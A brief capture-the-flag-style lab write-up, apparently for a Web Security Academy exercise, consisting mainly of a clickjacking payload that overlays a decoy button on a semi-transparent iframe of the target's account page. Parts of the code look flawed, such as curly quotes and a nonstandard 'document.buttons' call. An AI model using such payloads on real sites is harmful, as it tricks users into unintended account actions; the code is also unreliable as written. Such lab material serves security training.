# Lab: Basic clickjacking with CSRF token protection

URL: 


We will use the following payload:

```
<input type=button value="click" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
<iframe src="https://0a61002303510d3180cf44570053000f.web-security-academy.net/my-account" width=100% height=100% style=”opacity: 0.5;”>
<script>document.buttons[1].click()</script>
</iframe>
```